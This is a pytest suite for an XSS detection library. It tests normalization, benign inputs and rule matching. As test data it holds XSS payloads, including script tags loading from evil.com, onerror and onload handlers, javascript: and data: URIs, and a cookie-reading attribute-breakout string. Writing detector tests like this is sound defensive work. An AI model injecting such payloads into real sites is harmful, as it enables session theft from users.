import pytest
from security import (
    XSSDetector,
    default_detector,
    DetectionInput,
    Normalizer,
    BUILTIN_RULES
)


# ============================================================================
# DETECTOR CREATION & INITIALIZATION (Checks 1-2)
# ============================================================================

def test_detector_initialization():
    """1. Test that XSSDetector initializes cleanly."""
    detector = XSSDetector()
    assert detector is not None
    assert len(detector.rules) > 0


def test_builtin_rules_loaded():
    """2. Test that built-in rule registry loads expected rules."""
    rule_ids = [r.rule_id for r in BUILTIN_RULES]
    assert "XSS-001" in rule_ids  # Script tag
    assert "XSS-002" in rule_ids  # Event handler
    assert "XSS-003" in rule_ids  # Pseudo-protocol
    assert "XSS-004" in rule_ids  # Dangerous tag
    assert "XSS-005" in rule_ids  # Attribute breakout
    assert "XSS-006" in rule_ids  # JS sink


# ============================================================================
# NORMALIZATION TESTS (Checks 3-5)
# ============================================================================

def test_normalization_whitespace():
    """3. Test whitespace stripping and trimming."""
    raw = "   \t\n  <script>   \n "
    normalized = Normalizer.normalize(raw)
    assert normalized == "<script>"


def test_normalization_case():
    """4. Test that regex rules handle mixed-case variations in normalized text."""
    raw = "<sCrIpt>AlErT(1)</ScRipT>"
    det_input = DetectionInput(value=raw)
    result = default_detector.analyze(det_input)
    assert result.detected is True
    assert any(r.rule_id == "XSS-001" for r in result.matched_rules)


def test_normalization_encoded_data():
    """5. Test safe multi-pass URL and HTML entity decoding."""
    # URL encoded <script>
    url_encoded = "%3Cscript%3E"
    assert Normalizer.normalize(url_encoded) == "<script>"

    # HTML entity encoded <script>
    html_encoded = "&lt;script&gt;"
    assert Normalizer.normalize(html_encoded) == "<script>"

    # Double URL encoded
    double_encoded = "%253Cscript%253E"
    assert Normalizer.normalize(double_encoded) == "<script>"


# ============================================================================
# SAFE INPUT TESTS (Checks 6-9)
# ============================================================================

def test_safe_normal_text_not_detected():
    """6. Normal conversational text is not detected as XSS."""
    inputs = [
        "Hello, this is a legitimate comment.",
        "Python 3.11 web development with Flask.",
        "Cybersecurity monitoring architecture."
    ]
    for text in inputs:
        res = default_detector.analyze(DetectionInput(value=text))
        assert res.detected is False
        assert res.risk_level == "NONE"


def test_safe_punctuation_not_detected():
    """7. Normal punctuation and symbols are not flagged as malicious."""
    punctuations = [
        "Price: $100 < $200 & quality > average!",
        "John's report: 'Security Analysis 2026'.",
        "Equation: 5 < 10 and 10 > 2."
    ]
    for text in punctuations:
        res = default_detector.analyze(DetectionInput(value=text))
        assert res.detected is False


def test_safe_html_discussion_not_detected():
    """8. Harmless discussion of HTML/JS concepts is not detected."""
    discussions = [
        "In this chapter we study HTML syntax and JavaScript functions.",
        "SVG stands for Scalable Vector Graphics.",
        "Remember to register an event handler in Python GUI."
    ]
    for text in discussions:
        res = default_detector.analyze(DetectionInput(value=text))
        assert res.detected is False


def test_safe_urls_not_detected():
    """9. Normal HTTPS and HTTP web URLs are not flagged."""
    urls = [
        "https://example.com/docs/index.html",
        "http://security-research.org/articles?id=42",
        "https://github.com/project"
    ]
    for url in urls:
        res = default_detector.analyze(DetectionInput(value=url, context="url"))
        assert res.detected is False


# ============================================================================
# XSS PATTERN TESTS (Checks 10-15)
# ============================================================================

def test_script_tag_pattern_detected():
    """10. Script-style patterns are detected (XSS-001)."""
    payloads = [
        "<script>alert(1)</script>",
        "<SCRIPT SRC='http://evil.com/xss.js'></SCRIPT>",
        "<script /x >alert(1)</script>"
    ]
    for payload in payloads:
        res = default_detector.analyze(DetectionInput(value=payload))
        assert res.detected is True
        assert any(r.rule_id == "XSS-001" for r in res.matched_rules)


def test_event_handler_pattern_detected():
    """11. Inline DOM event handler attributes are detected (XSS-002)."""
    payloads = [
        "<img src=x onerror=alert(1)>",
        "<body onload=doEvil()>",
        "<input onfocus=alert(1)>"
    ]
    for payload in payloads:
        res = default_detector.analyze(DetectionInput(value=payload))
        assert res.detected is True
        assert any(r.rule_id == "XSS-002" for r in res.matched_rules)


def test_javascript_pseudo_protocol_detected():
    """12. JavaScript and VBScript URI schemes are detected (XSS-003)."""
    payloads = [
        "javascript:alert(document.cookie)",
        "JAVASCRIPT:prompt(1)",
        "vbscript:msgbox(1)",
        "data:text/html,<script>alert(1)</script>"
    ]
    for payload in payloads:
        res = default_detector.analyze(DetectionInput(value=payload, context="url"))
        assert res.detected is True
        assert any(r.rule_id == "XSS-003" for r in res.matched_rules)


def test_dangerous_svg_and_iframe_tags_detected():
    """13. Suspicious SVG, iframe, and embed elements are detected (XSS-004)."""
    payloads = [
        "<svg><animate onbegin=alert(1)>",
        "<iframe src='http://evil.com'></iframe>",
        "<embed src='payload.swf'>"
    ]
    for payload in payloads:
        res = default_detector.analyze(DetectionInput(value=payload))
        assert res.detected is True
        assert any(r.rule_id == "XSS-004" for r in res.matched_rules)


def test_encoded_suspicious_pattern_handled():
    """14. Encoded suspicious patterns are detected after normalization."""
    # URL encoded <img src=x onerror=alert(1)>
    encoded_payload = "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
    res = default_detector.analyze(DetectionInput(value=encoded_payload))
    assert res.detected is True
    assert any(r.rule_id == "XSS-002" for r in res.matched_rules)


def test_multiple_indicators_increase_risk():
    """15. Compound indicators produce elevated CRITICAL risk level."""
    # Breakout + Event handler + Sink call
    compound_payload = "\"><img src=x onerror=alert(document.cookie)>"
    res = default_detector.analyze(DetectionInput(value=compound_payload))
    assert res.detected is True
    assert res.risk_level == "CRITICAL"
    assert len(res.matched_rules) >= 2


# ============================================================================
# DETECTION RESULT STRUCTURE (Checks 16-20)
# ============================================================================

def test_result_structure_integrity():
    """16-20. Test matched rules, risk level, context, field name, and explanation."""
    payload = "<script>alert('test')</script>"
    det_input = DetectionInput(
        value=payload,
        source="form",
        field="test_field",
        method="POST",
        endpoint="/test",
        context="html_text",
        request_id="req-test-999"
    )
    result = default_detector.analyze(det_input)

    assert result.detected is True
    assert result.risk_level in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
    assert len(result.matched_rules) > 0
    assert result.context == "html_text"
    assert result.source == "form"
    assert result.field_name == "test_field"
    assert result.request_id == "req-test-999"
    assert len(result.reasoning) > 0
    assert len(result.input_hash) == 64  # Valid SHA-256


# ============================================================================
# STABILITY & RESILIENCE TESTS (Checks 36-37)
# ============================================================================

def test_long_bounded_input_stability():
    # 36. Test very long bounded inputs do not crash or hang detector
    long_safe = 'A' * 10000
    res = default_detector.analyze(DetectionInput(value=long_safe))
    assert res.detected is False

    long_payload = ('A' * 2000) + '<script>alert(1)</script>' + ('B' * 2000)
    res2 = default_detector.analyze(DetectionInput(value=long_payload))
    assert res2.detected is True
    assert any(r.rule_id == 'XSS-001' for r in res2.matched_rules)


def test_repeated_analysis_idempotency():
    # 37. Repeated analysis does not corrupt detector internal state
    payload = '<img src=x onerror=alert(1)>'
    for _ in range(20):
        res = default_detector.analyze(DetectionInput(value=payload))
        assert res.detected is True
        assert res.risk_level == 'CRITICAL'
        assert any(r.rule_id == 'XSS-002' for r in res.matched_rules)
